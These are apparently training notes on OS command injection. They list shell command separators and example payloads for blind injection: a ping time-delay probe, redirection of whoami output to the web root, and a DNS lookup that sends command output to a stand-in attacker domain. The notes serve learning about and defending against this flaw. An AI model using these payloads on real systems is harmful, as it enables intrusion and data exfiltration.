# OS Command Injection

![OS Command Injection](Attachments/Pasted%20image%2020260816233209.png)

## Example Scenario

An application executes a shell command containing user-supplied input:

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Underlying executed command:

```bash
stockreport.pl 381 29
```

## Command Separators

Common command separators that work on both Windows and Unix-based systems:
- `&`
- `&&`
- `|`
- `||`

Command separators that work only on Unix-based systems:
- `;`
- Newline (`0x0a` or `\n`)

## Blind OS Command Injection Vulnerabilities

### Detecting Blind OS Command Injection Using Time Delays

Triggering a time delay to verify command execution:

```bash
& ping -c 10 127.0.0.1 &
```

### Exploiting Blind OS Command Injection by Redirecting Output

Redirecting command output to an accessible file on the web server:

```bash
& whoami > /var/www/static/whoami.txt &
```

### Exploiting Blind OS Command Injection Using Out-of-Band (OAST) Techniques

Exfiltrating data or verifying execution via DNS lookup:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```